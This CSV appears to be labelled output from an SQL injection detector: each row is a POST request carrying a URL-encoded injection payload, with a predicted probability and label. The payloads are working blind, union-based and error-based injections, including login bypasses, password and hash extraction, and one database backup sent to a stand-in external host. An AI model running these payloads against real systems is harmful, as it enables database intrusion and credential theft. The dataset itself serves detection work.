Method,length,content,URL,Predicted_Probability,Predicted_Label
POST,244,p=1%20and%20%28select%20sleep%2810%29%20from%20dual%20where%20%28select%20table_name%20from%20information_schema.columns%20where%20table_schema%3Ddatabase%28%29%20and%20column_name%20like%20%27%pass%%27%20limit%200%2C1%29%20like%20%27%%27%29%23,/,1.0,1
POST,104,p=1%20AND%20SELECT%20SUBSTR%28column_name%2C1%2C1%29%20FROM%20information_schema.columns%20%3E%20%27A%27,/,1.0,1
POST,102,p=1%20AND%20SELECT%20SUBSTR%28table_name%2C1%2C1%29%20FROM%20information_schema.tables%20%3E%20%27A%27,/,1.0,1
POST,52,p=1%20and%20substring%28version%28%29%2C1%2C1%29%3D5,/,1.0,1
POST,44,p=1/%2Acomment%2A/and/%2A%2A/1%3D1/%2A%2A/--,/,1.0,1
POST,36,p=1%27%20GROUP%20BY%201%2C2%2C3--%2B,/,1.0,1
POST,37,p=1%20%7C%7C%20lpad%28user%2C7%2C1%29,/,1.0,1
POST,50,p=1%20or%20benchmark%2810000000%2CMD5%281%29%29%23,/,1.0,1
POST,53,p=1%29%20or%20benchmark%2810000000%2CMD5%281%29%29%23,/,1.0,1
POST,56,p=1%29%29%20or%20benchmark%2810000000%2CMD5%281%29%29%23,/,1.0,1
POST,36,p=1%27%20ORDER%20BY%201%2C2%2C3--%2B,/,1.0,1
POST,28,p=1%27%20ORDER%20BY%202--%2B,/,1.0,1
POST,28,p=1%20or%20pg_sleep%285%29--,/,1.0,1
POST,31,p=1%29%20or%20pg_sleep%285%29--,/,1.0,1
POST,34,p=1%29%29%20or%20pg_sleep%285%29--,/,1.0,1
POST,26,p=1%20or%20sleep%285%29%23,/,1.0,1
POST,29,p=1%29%20or%20sleep%285%29%23,/,1.0,1
POST,32,p=1%29%29%20or%20sleep%285%29%23,/,1.0,1
POST,47,p=1%3B%28select%201%20from%20pg_sleep%285%29%29,/,1.0,1
POST,50,p=1%7C%7C%28select%201%20from%20pg_sleep%285%29%29,/,1.0,1
POST,99,p=1%27UNION/%2A%210SELECT%20user%2C2%2C3%2C4%2C5%2C6%2C7%2C8%2C9/%2A%210from/%2A%210mysql.user/%2A-,/,1.0,1
POST,74,p=1%20uNIoN%28sEleCT%2B1%2C2%2C3%2C4%2C5%2C6%2C7%2C8%2C9%2C10%2C11%2C12%29,/,1.0,1
POST,114,p=1%20union%20all%20select%201%2C2%2C3%2C4%2C5%2C6%2Cname%20from%20sysobjects%20where%20xtype%20%3D%20%27u%27%20--,/,1.0,1
POST,32,p=1%20union%20select%201%2C2%2C3,/,1.0,1
POST,50,p=1%2Bun/%2A%2A/ion%2Bsel/%2A%2A/ect%2B1%2C2%2C3--,/,1.0,1
POST,34,p=1%2Bunion%2Bselect%2B1%2C2%2C3--,/,1.0,1
POST,56,p=.1union/%2A%2A_%2A%2A/select/%2A%21.1%2A/%2C2%2C3--%2B,/,1.0,1
POST,41,p=-1%27%20UNION%20SELECT%201%2C2%2C3--%2B,/,1.0,1
POST,74,p=1%20uNIoN%28sEleCT%201%2C2%2C3%2C4%2C5%2C6%2C7%2C8%2C9%2C10%2C11%2C12%29,/,1.0,1
POST,130,p=%281%29union%28%28%28%28%28%28%28select%281%29%2Chex%28hash%29from%28users%29%29%29%29%29%29%29%29%20/%281%29or%280x50%3D0x50%29,/,1.0,1
POST,44,p=-1%20UNION%20SELECT%201%20INTO%20%40%2C%40,/,1.0,1
POST,144,p=%281%29union%28select%281%29%2Cmid%28hash%2C1%2C32%29from%28users%29%29%20/1%2Bunion%2B%28select%271%27%2Cconcat%28login%2Chash%29from%2Busers,/,1.0,1
POST,65,p=1%20union%20select%20username%2Cpassword%2C3%2C4%20from%20users,/,1.0,1
POST,40,p=1%20%7C%7C%20user_id%20is%20not%20null,/,1.0,1
POST,94,p=2100935%27%20OR%20IF%28MID%28%40%40version%2C1%2C1%29%3D%274%27%2Csleep%281%29%2C1%29%3D%272,/,1.0,1
POST,94,p=2100935%27%20OR%20IF%28MID%28%40%40version%2C1%2C1%29%3D%275%27%2Csleep%281%29%2C1%29%3D%272,/,1.0,1
POST,52,p=%23%3Fzen%3F%0Aunion%20all%23zen%0A%23Zen%0Aselect,/,1.0,1
POST,65,p=%2c%28select%20%2A%20from%20%28select%28sleep%2810%29%29%29a%29,/,1.0,1
POST,35,p=a%22and/%2Ag%2A/456%3D678--%20%23,/,1.0,1
POST,35,p=a%27and/%2Ag%2A/456%3D678--%20%23,/,1.0,1
POST,16,p=admin%22%20%23,/,0.9999993,1
POST,15,p=admin%22%20--,/,1.0,1
POST,14,p=admin%22/%2A,/,1.0,1
POST,41,p=admin%27%29%20or%20%271%27%3D%271%27%23,/,1.0,1
POST,40,p=admin%27or%201%3D1%20or%20%27%27%3D%27,/,1.0,1
POST,55,p=%20and%200%3Dbenchmark%283000000%2CMD5%281%29%29%20--,/,1.0,1
POST,57,p=%20and%200%3Dbenchmark%283000000%2CMD5%281%29%29%20/%2A,/,1.0,1
POST,58,p=%22%20and%200%3Dbenchmark%283000000%2CMD5%281%29%29%20--,/,1.0,1
POST,60,p=%22%20and%200%3Dbenchmark%283000000%2CMD5%281%29%29%20/%2A,/,1.0,1
POST,61,p=%22%29%20and%200%3Dbenchmark%283000000%2CMD5%281%29%29%20--,/,1.0,1
POST,63,p=%22%29%20and%200%3Dbenchmark%283000000%2CMD5%281%29%29%20/%2A,/,1.0,1
POST,64,p=%22%29%29%20and%200%3Dbenchmark%283000000%2CMD5%281%29%29%20--,/,1.0,1
POST,66,p=%22%29%29%20and%200%3Dbenchmark%283000000%2CMD5%281%29%29%20/%2A,/,1.0,1
POST,67,p=%22%29%29%29%20and%200%3Dbenchmark%283000000%2CMD5%281%29%29%20--,/,1.0,1
POST,69,p=%22%29%29%29%20and%200%3Dbenchmark%283000000%2CMD5%281%29%29%20/%2A,/,1.0,1
POST,70,p=%22%29%29%29%29%20and%200%3Dbenchmark%283000000%2CMD5%281%29%29%20--,/,1.0,1
POST,72,p=%22%29%29%29%29%20and%200%3Dbenchmark%283000000%2CMD5%281%29%29%20/%2A,/,1.0,1
POST,58,p=%27%20and%200%3Dbenchmark%283000000%2CMD5%281%29%29%20--,/,1.0,1
POST,60,p=%27%20and%200%3Dbenchmark%283000000%2CMD5%281%29%29%20/%2A,/,1.0,1
POST,61,p=%27%29%20and%200%3Dbenchmark%283000000%2CMD5%281%29%29%20--,/,1.0,1
POST,63,p=%27%29%20and%200%3Dbenchmark%283000000%2CMD5%281%29%29%20/%2A,/,1.0,1
POST,64,p=%27%29%29%20and%200%3Dbenchmark%283000000%2CMD5%281%29%29%20--,/,1.0,1
POST,66,p=%27%29%29%20and%200%3Dbenchmark%283000000%2CMD5%281%29%29%20/%2A,/,1.0,1
POST,67,p=%27%29%29%29%20and%200%3Dbenchmark%283000000%2CMD5%281%29%29%20--,/,1.0,1
POST,69,p=%27%29%29%29%20and%200%3Dbenchmark%283000000%2CMD5%281%29%29%20/%2A,/,1.0,1
POST,70,p=%27%29%29%29%29%20and%200%3Dbenchmark%283000000%2CMD5%281%29%29%20--,/,1.0,1
POST,72,p=%27%29%29%29%29%20and%200%3Dbenchmark%283000000%2CMD5%281%29%29%20/%2A,/,1.0,1
POST,58,p=%29%20and%200%3Dbenchmark%283000000%2CMD5%281%29%29%20--,/,1.0,1
POST,60,p=%29%20and%200%3Dbenchmark%283000000%2CMD5%281%29%29%20/%2A,/,1.0,1
POST,61,p=%29%29%20and%200%3Dbenchmark%283000000%2CMD5%281%29%29%20--,/,1.0,1
POST,63,p=%29%29%20and%200%3Dbenchmark%283000000%2CMD5%281%29%29%20/%2A,/,1.0,1
POST,64,p=%29%29%29%20and%200%3Dbenchmark%283000000%2CMD5%281%29%29%20--,/,1.0,1
POST,66,p=%29%29%29%20and%200%3Dbenchmark%283000000%2CMD5%281%29%29%20/%2A,/,1.0,1
POST,67,p=%29%29%29%29%20and%200%3Dbenchmark%283000000%2CMD5%281%29%29%20--,/,1.0,1
POST,69,p=%29%29%29%29%20and%200%3Dbenchmark%283000000%2CMD5%281%29%29%20/%2A,/,1.0,1
POST,56,p=%20and%200%3Dbenchmark%283000000%2CMD5%281%29%29%20%23,/,1.0,1
POST,59,p=%22%20and%200%3Dbenchmark%283000000%2CMD5%281%29%29%20%23,/,1.0,1
POST,62,p=%22%29%20and%200%3Dbenchmark%283000000%2CMD5%281%29%29%20%23,/,1.0,1
POST,65,p=%22%29%29%20and%200%3Dbenchmark%283000000%2CMD5%281%29%29%20%23,/,1.0,1
POST,68,p=%22%29%29%29%20and%200%3Dbenchmark%283000000%2CMD5%281%29%29%20%23,/,1.0,1
POST,71,p=%22%29%29%29%29%20and%200%3Dbenchmark%283000000%2CMD5%281%29%29%20%23,/,1.0,1
POST,59,p=%27%20and%200%3Dbenchmark%283000000%2CMD5%281%29%29%20%23,/,1.0,1
POST,62,p=%27%29%20and%200%3Dbenchmark%283000000%2CMD5%281%29%29%20%23,/,1.0,1
POST,65,p=%27%29%29%20and%200%3Dbenchmark%283000000%2CMD5%281%29%29%20%23,/,1.0,1
POST,68,p=%27%29%29%29%20and%200%3Dbenchmark%283000000%2CMD5%281%29%29%20%23,/,1.0,1
POST,71,p=%27%29%29%29%29%20and%200%3Dbenchmark%283000000%2CMD5%281%29%29%20%23,/,1.0,1
POST,59,p=%29%20and%200%3Dbenchmark%283000000%2CMD5%281%29%29%20%23,/,1.0,1
POST,62,p=%29%29%20and%200%3Dbenchmark%283000000%2CMD5%281%29%29%20%23,/,1.0,1
POST,65,p=%29%29%29%20and%200%3Dbenchmark%283000000%2CMD5%281%29%29%20%23,/,1.0,1
POST,68,p=%29%29%29%29%20and%200%3Dbenchmark%283000000%2CMD5%281%29%29%20%23,/,1.0,1
POST,16,p=%20AND%201%3D0,/,1.0,1
POST,19,p=%20AND%201%3D0%23,/,1.0,1
POST,21,p=%20AND%201%3D0--%20,/,1.0,1
POST,45,p=%20AND%201083%3D1083%20AND%20%281427%3D1427,/,1.0,1
POST,38,p=%20AND%201%3D0%20AND%20%27%%27%3D%27,/,1.0,1
POST,16,p=%20AND%201%3D1,/,1.0,1
POST,19,p=%20AND%201%3D1%23,/,1.0,1
POST,21,p=%20AND%201%3D1--%20,/,1.0,1
POST,38,p=%20AND%201%3D1%20AND%20%27%%27%3D%27,/,1.0,1
POST,199,p=%27%20and%201%3Dcast%28%28SELECT%20column_name%20FROM%20information_schema.columns%20WHERE%20table_name%3D%27data_table%27%20LIMIT%201%20OFFSET%20data_offset%29%20as%20int%29%20and%20%271%27%3D%271,/,1.0,1
POST,134,p=%27%20and%201%3Dcast%28%28SELECT%20concat%28%27DATABASE%3A%20%27%2Ccurrent_database%28%29%29%29%20as%20int%29%20and%20%271%27%3D%271,/,1.0,1
POST,143,p=%27%20and%201%3Dcast%28%28SELECT%20data_column%20FROM%20data_table%20LIMIT%201%20OFFSET%20data_offset%29%20as%20int%29%20and%20%271%27%3D%271,/,1.0,1
POST,157,p=%27%20and%201%3Dcast%28%28SELECT%20table_name%20FROM%20information_schema.tables%20LIMIT%201%20OFFSET%20data_offset%29%20as%20int%29%20and%20%271%27%3D%271,/,1.0,1
POST,126,p=%27%20and%201%3D%28%20if%28%28load_file%28char%28110%2C46%2C101%2C120%2C116%29%29%3C%3Echar%2839%2C39%29%29%2C1%2C0%29%29%3B,/,1.0,1
POST,137,p=%27%20and%201%20in%20%28select%20min%28name%29%20from%20sysobjects%20where%20xtype%20%3D%20%27U%27%20and%20name%20%3E%20%27.%27%29%20--,/,1.0,1
POST,57,p=%27%20and%201%20in%20%28select%20var%20from%20temp%29--,/,1.0,1
POST,137,p=%27%20AND%201%3Dutl_inaddr.get_host_address%28%28SELECT%20banner%20FROM%20v%24version%20WHERE%20ROWNUM%3D1%29%29%20AND%20%27i%27%3D%27i,/,1.0,1
POST,154,p=%27%20AND%201%3Dutl_inaddr.get_host_address%28%28SELECT%20COUNT%28DISTINCT%28column_name%29%29%20FROM%20sys.all_tab_columns%29%29%20AND%20%27i%27%3D%27i,/,1.0,1
POST,185,p=%27%20AND%201%3Dutl_inaddr.get_host_address%28%28SELECT%20COUNT%28DISTINCT%28GRANTED_ROLE%29%29%20FROM%20DBA_ROLE_PRIVS%20WHERE%20GRANTEE%3DSYS.LOGIN_USER%29%29%20AND%20%27i%27%3D%27i,/,1.0,1
POST,143,p=%27%20AND%201%3Dutl_inaddr.get_host_address%28%28SELECT%20COUNT%28DISTINCT%28PASSWORD%29%29%20FROM%20SYS.USER%24%29%29%20AND%20%27i%27%3D%27i,/,1.0,1
POST,148,p=%27%20AND%201%3Dutl_inaddr.get_host_address%28%28SELECT%20COUNT%28DISTINCT%28table_name%29%29%20FROM%20sys.all_tables%29%29%20AND%20%27i%27%3D%27i,/,1.0,1
POST,145,p=%27%20AND%201%3Dutl_inaddr.get_host_address%28%28SELECT%20COUNT%28DISTINCT%28USERNAME%29%29%20FROM%20SYS.ALL_USERS%29%29%20AND%20%27i%27%3D%27i,/,1.0,1
POST,234,p=%27%20AND%201%3Dutl_inaddr.get_host_address%28%28SELECT%20DISTINCT%28column_name%29%20FROM%20%28SELECT%20DISTINCT%28column_name%29%2C%20ROWNUM%20AS%20LIMIT%20FROM%20all_tab_columns%29%20WHERE%20LIMIT%3D3%29%29%20AND%20%27i%27%3D%27i,/,1.0,1
POST,269,p=%27%20AND%201%3Dutl_inaddr.get_host_address%28%28SELECT%20DISTINCT%28granted_role%29%20FROM%20%28SELECT%20DISTINCT%28granted_role%29%2C%20ROWNUM%20AS%20LIMIT%20FROM%20dba_role_privs%20WHERE%20GRANTEE%3DSYS.LOGINUSER%29%20WHERE%20LIMIT%3D3%29%29%20AND%20%27i%27%3D%27i,/,1.0,1
POST,224,p=%27%20AND%201%3Dutl_inaddr.get_host_address%28%28SELECT%20DISTINCT%28PASSWORD%29%20FROM%20%28SELECT%20DISTINCT%28PASSWORD%29%2C%20ROWNUM%20AS%20LIMIT%20FROM%20SYS.USER%24%29%20WHERE%20LIMIT%3D3%29%29%20AND%20%27i%27%3D%27i,/,1.0,1
POST,231,p=%27%20AND%201%3Dutl_inaddr.get_host_address%28%28SELECT%20DISTINCT%28table_name%29%20FROM%20%28SELECT%20DISTINCT%28table_name%29%2C%20ROWNUM%20AS%20LIMIT%20FROM%20sys.all_tables%29%20WHERE%20LIMIT%3D6%29%29%20AND%20%27i%27%3D%27i,/,1.0,1
POST,226,p=%27%20AND%201%3Dutl_inaddr.get_host_address%28%28SELECT%20DISTINCT%28USERNAME%29%20FROM%20%28SELECT%20DISTINCT%28USERNAME%29%2C%20ROWNUM%20AS%20LIMIT%20FROM%20SYS.ALL_USERS%29%20WHERE%20LIMIT%3D5%29%29%20AND%20%27i%27%3D%27i,/,1.0,1
POST,121,p=%27%20AND%201%3Dutl_inaddr.get_host_address%28%28SELECT%20global_name%20FROM%20global_name%29%29%20AND%20%27i%27%3D%27i,/,1.0,1
POST,120,p=%27%20AND%201%3Dutl_inaddr.get_host_address%28%28SELECT%20host_name%20FROM%20v%24instance%29%29%20AND%20%27i%27%3D%27i,/,1.0,1
POST,120,p=%27%20AND%201%3Dutl_inaddr.get_host_address%28%28SELECT%20SYS.DATABASE_NAME%20FROM%20DUAL%29%29%20AND%20%27i%27%3D%27i,/,1.0,1
POST,117,p=%27%20AND%201%3Dutl_inaddr.get_host_address%28%28SELECT%20SYS.LOGIN_USER%20FROM%20DUAL%29%29%20AND%20%27i%27%3D%27i,/,1.0,1
POST,89,p=AND%202947%3DLIKE%28%27ABCDEFG%27%2CUPPER%28HEX%28RANDOMBLOB%281000000000/2%29%29%29%29,/,1.0,1
POST,88,p=AND%202947%3DLIKE%28%27ABCDEFG%27%2CUPPER%28HEX%28RANDOMBLOB%28500000000/2%29%29%29%29,/,1.0,1
POST,325,p=%20AND%203516%3DCAST%28%28CHR%28113%29%7C%7CCHR%28106%29%7C%7CCHR%28122%29%7C%7CCHR%28106%29%7C%7CCHR%28113%29%29%7C%7C%28SELECT%20%28CASE%20WHEN%20%283516%3D3516%29%20THEN%201%20ELSE%200%20END%29%29%3A%3Atext%7C%7C%28CHR%28113%29%7C%7CCHR%28112%29%7C%7CCHR%28106%29%7C%7CCHR%28107%29%7C%7CCHR%28113%29%29%20AS%20NUMERIC%29,/,1.0,1
POST,314,p=%20AND%205650%3DCONVERT%28INT%2C%28SELECT%20CHAR%28113%29%2BCHAR%28106%29%2BCHAR%28122%29%2BCHAR%28106%29%2BCHAR%28113%29%2B%28SELECT%20%28CASE%20WHEN%20%285650%3D5650%29%20THEN%20CHAR%2849%29%20ELSE%20CHAR%2848%29%20END%29%29%2BCHAR%28113%29%2BCHAR%28112%29%2BCHAR%28106%29%2BCHAR%28107%29%2BCHAR%28113%29%29%29,/,1.0,1
POST,75,p=%20AND%205650%3DCONVERT%28INT%2C%28UNION%20ALL%20SELECTCHAR%2888%29%29%29,/,1.0,1
POST,78,p=%20AND%205650%3DCONVERT%28INT%2C%28UNION%20ALL%20SELECTCHAR%2888%29%29%29%23,/,1.0,1
POST,80,p=%20AND%205650%3DCONVERT%28INT%2C%28UNION%20ALL%20SELECTCHAR%2888%29%29%29--%20,/,1.0,1
POST,93,p=%20AND%205650%3DCONVERT%28INT%2C%28UNION%20ALL%20SELECTCHAR%2888%29%2BCHAR%2888%29%29%29%23,/,1.0,1
POST,95,p=%20AND%205650%3DCONVERT%28INT%2C%28UNION%20ALL%20SELECTCHAR%2888%29%2BCHAR%2888%29%29%29--%20,/,1.0,1
POST,48,p=%%27%20AND%208310%3D8311%20AND%20%27%%27%3D%27,/,1.0,1
POST,97,p=AND%20MAKE_SET%28YOLO%3Cascii%28substring%28concat%28login%2Cpassword%29%2CPOS%2C1%29%29%2C1%29,/,1.0,1
POST,82,p=AND%20MAKE_SET%28YOLO%3Cascii%28substring%28version%28%29%2CPOS%2C1%29%29%2C1%29,/,1.0,1
POST,91,p=AND%20MAKE_SET%28YOLO%3C%28SELECT%28length%28concat%28login%2Cpassword%29%29%29%29%2C1%29,/,1.0,1
POST,76,p=AND%20MAKE_SET%28YOLO%3C%28SELECT%28length%28version%28%29%29%29%29%2C1%29,/,1.0,1
POST,63,p=%27%20AND%20MID%28VERSION%28%29%2C1%2C1%29%20%3D%20%275%27%3B,/,1.0,1
POST,95,p=%20AND%20%5BRANDNUM%5D%3DDBMS_PIPE.RECEIVE_MESSAGE%28%27%5BRANDSTR%5D%27%2C%5BSLEEPTIME%5D%29,/,1.0,1
POST,114,p=%20AND%20%5BRANDNUM%5D%3DLIKE%28%27ABCDEFG%27%2CUPPER%28HEX%28RANDOMBLOB%28%5BSLEEPTIME%5D00000000/2%29%29%29%29,/,1.0,1
POST,109,p=AND%20%5BRANDNUM%5D%3D%28SELECT%20COUNT%28%2A%29%20FROM%20GENERATE_SERIES%281%2C%5BSLEEPTIME%5D000000%29%29,/,1.0,1
POST,91,p=AND%20%5BRANDNUM%5D%3D%28SELECT%20%5BRANDNUM%5D%20FROM%20PG_SLEEP%28%5BSLEEPTIME%5D%29%29,/,1.0,1
POST,247,p=%20AND%20%28SELECT%204523%20FROM%28SELECT%20COUNT%28%2A%29%2CCONCAT%280x716a7a6a71%2C%28SELECT%20%28ELT%284523%3D4523%2C1%29%29%29%2C0x71706a6b71%2CFLOOR%28RAND%280%29%2A2%29%29x%20FROM%20INFORMATION_SCHEMA.CHARACTER_SETS%20GROUP%20BY%20x%29a%29,/,1.0,1
POST,219,p=%27%20and%20%28SELECT%20count%28%2A%29%20from%20sysibm.columns%20t1%2C%20sysibm.columns%20t2%2C%20sysibm.columns%20t3%29%3E0%20and%20%28select%20ascii%28substr%28user%2C1%2C1%29%29%20from%20sysibm.sysdummy1%29%3D68%20,/,1.0,1
POST,99,p=AND%20%28SELECT%20%2A%20FROM%20%28SELECT%28SLEEP%285%29%29%29bAKL%29%20AND%20%27vRxe%27%3D%27vRxe,/,1.0,1
POST,70,p=AND%20%28SELECT%20%2A%20FROM%20%28SELECT%28SLEEP%285%29%29%29nQIP%29,/,1.0,1
POST,73,p=AND%20%28SELECT%20%2A%20FROM%20%28SELECT%28SLEEP%285%29%29%29nQIP%29%23,/,1.0,1
POST,72,p=AND%20%28SELECT%20%2A%20FROM%20%28SELECT%28SLEEP%285%29%29%29nQIP%29--,/,1.0,1
POST,92,p=AND%20%28SELECT%20%2A%20FROM%20%28SELECT%28SLEEP%285%29%29%29YjoC%29%20AND%20%27%%27%3D%27,/,1.0,1
POST,217,p=and%20%28SELECT%20hex%28substr%28tbl_name%2C1%2C1%29%29%20FROM%20sqlite_master%20WHERE%20type%3D%27table%27%20and%20tbl_name%20NOT%20like%20%27sqlite_%%27%20limit%201%20offset%200%29%20%3E%20hex%28%27some_char%27%29,/,1.0,1
POST,72,p=%20and%20%28select%20substring%28%40%40version%2C3%2C1%29%29%3D%27S%27,/,1.0,1
POST,20,p=AnD%20SLEEP%285%29,/,1.0,1
POST,23,p=AnD%20SLEEP%285%29%23,/,1.0,1
POST,22,p=AnD%20SLEEP%285%29--,/,1.0,1
POST,39,p=%27%20AnD%20SLEEP%285%29%20ANd%20%271,/,1.0,1
POST,86,p=%27%20and%20substr%28version%28%29%2C1%2C10%29%20%3D%20%27PostgreSQL%27%20and%20%271,/,1.0,1
POST,86,p=%27%20and%20substr%28version%28%29%2C1%2C10%29%20%3D%20%27PostgreXXX%27%20and%20%271,/,1.0,1
POST,184,p=%27%20and%20updatexml%28null%2Cconcat%280x0a%2C%28select%20table_name%20from%20information_schema.tables%20where%20table_schema%3Ddatabase%28%29%20LIMIT%200%2C1%29%29%2Cnull%29--%20-,/,1.0,1
POST,81,p=%27%20and%20updatexml%28null%2Cconcat%280x0a%2Cversion%28%29%29%2Cnull%29--%20-,/,1.0,1
POST,230,p=AND%20updatexml%28rand%28%29%2Cconcat%280x3a%2C%28SELECT%20concat%28CHAR%28126%29%2Ccolumn_name%2CCHAR%28126%29%29%20FROM%20information_schema.columns%20WHERE%20TABLE_NAME%3Ddata_table%20LIMIT%20data_offset%2C1%29%29%2Cnull%29--,/,1.0,1
POST,190,p=AND%20updatexml%28rand%28%29%2Cconcat%280x3a%2C%28SELECT%20concat%28CHAR%28126%29%2Cdata_info%2CCHAR%28126%29%29%20FROM%20data_table.data_column%20LIMIT%20data_offset%2C1%29%29%2Cnull%29--,/,1.0,1
POST,197,p=AND%20updatexml%28rand%28%29%2Cconcat%280x3a%2C%28SELECT%20concat%28CHAR%28126%29%2Cschema_name%2CCHAR%28126%29%29%20FROM%20information_schema.schemata%20LIMIT%20data_offset%2C1%29%29%2Cnull%29--,/,1.0,1
POST,231,p=AND%20updatexml%28rand%28%29%2Cconcat%280x3a%2C%28SELECT%20concat%28CHAR%28126%29%2CTABLE_NAME%2CCHAR%28126%29%29%20FROM%20information_schema.TABLES%20WHERE%20table_schema%3Ddata_column%20LIMIT%20data_offset%2C1%29%29%2Cnull%29--,/,1.0,1
POST,101,p=AND%20updatexml%28rand%28%29%2Cconcat%28CHAR%28126%29%2Cversion%28%29%2CCHAR%28126%29%29%2Cnull%29-,/,1.0,1
POST,47,p=%20AS%20INJECTX%20WHERE%201%3D1%20AND%201%3D0,/,1.0,1
POST,50,p=%20AS%20INJECTX%20WHERE%201%3D1%20AND%201%3D0%23,/,1.0,1
POST,49,p=%20AS%20INJECTX%20WHERE%201%3D1%20AND%201%3D0--,/,1.0,1
POST,47,p=%20AS%20INJECTX%20WHERE%201%3D1%20AND%201%3D1,/,1.0,1
POST,50,p=%20AS%20INJECTX%20WHERE%201%3D1%20AND%201%3D1%23,/,1.0,1
POST,49,p=%20AS%20INJECTX%20WHERE%201%3D1%20AND%201%3D1--,/,1.0,1
POST,82,p=BACKUP%20database%20master%20to%20disks%3D%27%5C%5Cfake.domain%5Cbackupdb.dat%27,/,0.9999999,1
POST,41,p=benchmark%2810000000%2CMD5%281%29%29%23,/,1.0,1
POST,44,p=%2Bbenchmark%283200%2CSHA1%281%29%29%2B%27,/,1.0,1
POST,38,p=benchmark%2850000000%2CMD5%281%29%29,/,1.0,1
POST,41,p=benchmark%2850000000%2CMD5%281%29%29%23,/,1.0,1
POST,40,p=benchmark%2850000000%2CMD5%281%29%29--,/,1.0,1
POST,205,p=%2CcAsT%28chr%28126%29%7C%7C%28sEleCt%2Bcolumn_name%2BfRoM%2Binformation_schema.columns%2BwHerE%2Btable_name%3D%27data_table%27%2BlImIt%2B1%2Boffset%2Bdata_offset%29%7C%7Cchr%28126%29%2Bas%2BnUmeRiC%29--,/,1.0,1
POST,147,p=%2CcAsT%28chr%28126%29%7C%7C%28sEleCt%2Bdata_column%2BfRoM%2Bdata_table%2BlImIt%2B1%2Boffset%2Bdata_offset%29%7C%7Cchr%28126%29%2Bas%2BnUmeRiC%29,/,1.0,1
POST,163,p=%2CcAsT%28chr%28126%29%7C%7C%28sEleCt%2Btable_name%2BfRoM%2Binformation_schema.tables%2BlImIt%2B1%2Boffset%2Bdata_offset%29%7C%7Cchr%28126%29%2Bas%2BnUmeRiC%29--,/,1.0,1
POST,79,p=%2CcAsT%28chr%28126%29%7C%7CvErSiOn%28%29%7C%7Cchr%28126%29%2BaS%2BnUmeRiC%29,/,1.0,1
